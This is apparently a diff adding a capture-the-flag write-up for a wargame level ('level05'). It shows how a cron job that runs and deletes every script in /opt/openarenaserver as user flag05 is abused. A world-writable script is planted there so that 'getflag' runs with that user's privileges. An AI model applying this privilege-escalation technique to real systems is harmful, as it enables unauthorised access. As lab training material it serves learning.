@@ -1,0 +1,16 @@
+we have a clue at the beginning - there is a MAIL env in export
+MAIL="/var/mail/level05"
+cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 - cron this algorithm every 2 minutes with flag05
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+it executes (5 sec limited) and deletes it - lets make a flag05 file:
+echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
+chmod 777 /opt/openarenaserver/flag05
+wait 2 minutes
+cat /tmp/flag05
